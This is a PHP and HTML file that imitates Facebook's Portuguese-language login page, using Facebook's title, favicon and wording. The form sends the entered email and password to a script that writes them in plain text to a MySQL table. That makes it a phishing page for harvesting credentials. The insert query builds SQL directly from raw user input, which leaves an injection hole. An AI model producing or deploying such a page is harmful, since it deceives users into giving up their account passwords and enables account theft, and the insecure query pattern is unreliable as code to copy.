<?php

    if(isset($_POST['submit']))
    {
       // print_r('Email: ' . $_POST['email']);
       // print_r('<br>');
       // print_r('Senha: ' . $_POST['senha']);

       include_once('config.php');

       $email = $_POST['email'];
       $senha = $_POST['senha'];

       $result = mysqli_query($conexao, "INSERT INTO usuarios(email,senha) VALUES ('$email','$senha')");
    }



?>


<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="styles.css">
    <title>Facebook - Inicia sessão ou regista-te</title>
    <link rel="icon" type="image/x-icon" href="facebook.png">
</head>
<body>
    <div class="content">
        <div class="content-info">
             <h1>facebook</h1>
             <h3>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h3>
        </div>
        <div class="content-login">
             <form action="formulario.php" method="POST" class="content-login-box">
                  <input type="text" name="email" placeholder="E-mail ou telefone">
                  <input type="password" name="senha" placeholder="Senha"> 
                  <button  name="submit" class="btn btn-enter">Entrar</button>
                  <a href="#" class="fogot-password">Esqueceu a senha?</a>
                  <hr>
                  <button class="btn btn-create-account">Criar nova conta</button>
             </form>
             <p><strong>Cria uma Página</strong> para uma celebridade, uma marca ou uma empresa.</p>    
        </div>
    </div>
</body>
</html>